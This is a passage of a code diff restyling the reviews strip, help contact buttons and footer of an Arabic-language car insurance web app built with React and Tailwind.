-                <Phone className="h-4 w-4 text-[#f4ad27]" /> اتصل بنا
-              </a>
-              <a href="#" className="flex items-center justify-center gap-2 bg-[#f4ad27] hover:bg-[#e09a18] rounded-xl py-3 text-xs font-black text-[#1a3d52] transition-all shadow-md">
-                <MessageCircle className="h-4 w-4" /> واتساب
-              </a>
+        {/* ── Reviews strip ──────────────────────────────── */}
+        <div className="bg-gradient-to-l from-[#1a5676] to-[#0e3a57] rounded-2xl p-4 text-white">
+          <div className="flex items-center justify-between mb-3">
+            <div>
+              <p className="text-sm font-black">+500,000 عميل راضٍ</p>
+              <p className="text-[10px] text-white/60 mt-0.5">يثقون بخدماتنا يومياً</p>
+            </div>
+            <div className="text-left">
+              <div className="flex items-center gap-0.5 mb-0.5">
+                {[1,2,3,4,5].map(i => <Star key={i} className="w-3.5 h-3.5 fill-[#f4ad27] text-[#f4ad27]" />)}
+              </div>
+              <p className="text-[10px] text-white/60">4.9 / 5.0 تقييم</p>
             </div>
           </div>
-          <div className="bg-white border border-t-0 border-slate-100 grid grid-cols-3 divide-x divide-x-reverse divide-slate-100">
-            {[["98%", "رضى العملاء"], ["24/7", "خدمة مستمرة"], ["-30د", "متوسط الإتمام"]].map(([val, lbl]) => (
-              <div key={lbl} className="py-3 text-center">
-                <p className="text-sm font-black text-[#1a5676]">{val}</p>
-                <p className="text-[10px] text-slate-500 font-medium mt-0.5">{lbl}</p>
+          <div className="grid grid-cols-3 gap-2">
+            {[["98%","رضى العملاء"], ["24/7","دعم متواصل"], ["‎<3د","متوسط الإتمام"]].map(([v, l]) => (
+              <div key={l} className="bg-white/10 rounded-xl py-2.5 text-center border border-white/10">
+                <p className="text-base font-black text-[#f4ad27]">{v}</p>
+                <p className="text-[10px] text-white/60 font-medium mt-0.5">{l}</p>
               </div>
             ))}
+          </div>
+        </div>
+
+        {/* ── Help ───────────────────────────────────────── */}
+        <div className="bg-white rounded-2xl shadow-sm border border-slate-100 p-4 space-y-3">
+          <div className="flex items-center gap-3">
+            <div className="w-10 h-10 rounded-xl bg-[#1a5676]/10 flex items-center justify-center">
+              <HeadphonesIcon className="w-5 h-5 text-[#1a5676]" />
+            </div>
+            <div>
+              <p className="text-sm font-black text-slate-800">هل تحتاج مساعدة؟</p>
+              <p className="text-[11px] text-slate-500">فريقنا متاح على مدار الساعة</p>
+            </div>
+          </div>
+          <div className="grid grid-cols-2 gap-2">
+            <a href="tel:920000000" className="flex items-center justify-center gap-2 h-11 border-2 border-[#1a5676] text-[#1a5676] rounded-xl text-sm font-bold hover:bg-[#1a5676] hover:text-white transition-all">
+              <Phone className="h-4 w-4" /> اتصل بنا
+            </a>
+            <a href="#" className="flex items-center justify-center gap-2 h-11 bg-[#25d366] text-white rounded-xl text-sm font-bold hover:bg-[#1eb956] transition-all shadow-md shadow-green-200">
+              <MessageCircle className="h-4 w-4" /> واتساب
+            </a>
           </div>
         </div>
 
       </div>
 
-      {/* ─── Footer ──────────────────────────────────── */}
-      <footer className="bg-[#0c3a52] text-white">
-        <div className="max-w-md mx-auto px-4 pt-6 pb-5">
-          <div className="flex items-center justify-between mb-5">
-            <div className="flex items-center gap-2">
-              <div className="w-8 h-8 rounded-lg bg-[#f4ad27] flex items-center justify-center">
-                <Car className="w-4 h-4 text-[#1a3d52]" />
+      {/* ── Footer ─────────────────────────────────────── */}
+      <footer className="bg-[#062338] text-white">
+        <div className="max-w-md mx-auto px-4 pt-7 pb-6">
+          {/* Brand */}
+          <div className="flex items-center justify-between mb-6">
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 rounded-xl bg-[#f4ad27] flex items-center justify-center shadow-lg">
+                <Car className="w-5 h-5 text-[#1a3d52]" />
               </div>
               <div>
-                <p className="text-sm font-black">بي كير</p>
-                <p className="text-[10px] text-white/50">منصة التأمين الذكية</p>
+                <p className="text-base font-black">بي كير</p>
+                <p className="text-[10px] text-white/40">منصة التأمين الذكية</p>
               </div>
             </div>
-            <a href="tel:8001180044" className="flex items-center gap-1.5 bg-white/10 rounded-xl px-3 py-2">
-              <Phone className="h-3.5 w-3.5 text-[#f4ad27]" />
-              <span className="text-xs font-bold">8001180044</span>
+            <a href="tel:8001180044" className="bg-white/10 hover:bg-white/20 border border-white/20 rounded-xl px-3 py-2 transition-colors">
+              <p className="text-[10px] text-white/60 font-medium mb-0.5">الدعم المجاني</p>
+              <p className="text-sm font-black text-[#f4ad27]">800 118 0044</p>
             </a>
           </div>
 
-          <div className="grid grid-cols-2 gap-4 border-t border-white/10 pt-4 mb-4">
+          {/* Links */}
+          <div className="grid grid-cols-2 gap-4 mb-6 pb-6 border-b border-white/10">
             {[
               { title: "الخدمات", links: ["تأمين السيارات", "تأمين طبي", "تأمين سفر", "إدارة الوثيقة"] },
               { title: "الدعم", links: ["مركز المساعدة", "اتصل بنا", "الشروط والأحكام", "الخصوصية"] },
             ].map(({ title, links }) => (
               <div key={title}>
-                <p className="text-[10px] font-bold text-white/40 uppercase tracking-widest mb-2.5">{title}</p>
+                <p className="text-[10px] font-black text-white/30 uppercase tracking-widest mb-3">{title}</p>
                 {links.map((l) => (
-                  <button key={l} type="button" className="block text-[11px] text-white/65 hover:text-white py-1 transition-colors">{l}</button>
+                  <button key={l} type="button" className="block text-[11px] text-white/55 hover:text-white py-1 transition-colors font-medium">
+                    {l}
+                  </button>
                 ))}
               </div>
             ))}
           </div>
 
-          <div className="flex items-center justify-between border-t border-white/10 pt-4">
-            <p className="text-[10px] text-white/40">© 2024 بي كير. جميع الحقوق محفوظة.</p>
-            <div className="flex gap-2">
+          {/* Bottom */}
+          <div className="flex items-center justify-between">
+            <p className="text-[10px] text-white/30">© 2024 بي كير — جميع الحقوق محفوظة</p>
+            <div className="flex gap-1.5">
               {[Instagram, X, Youtube].map((Icon, i) => (
-                <span key={i} className="w-7 h-7 rounded-lg bg-white/10 hover:bg-white/20 flex items-center justify-center cursor-pointer transition-colors">
-                  <Icon className="h-3.5 w-3.5" />
+                <span key={i} className="w-8 h-8 rounded-xl bg-white/10 hover:bg-white/20 flex items-center justify-center cursor-pointer transition-colors">
+                  <Icon className="h-3.5 w-3.5 text-white/70" />
                 </span>
               ))}
             </div>
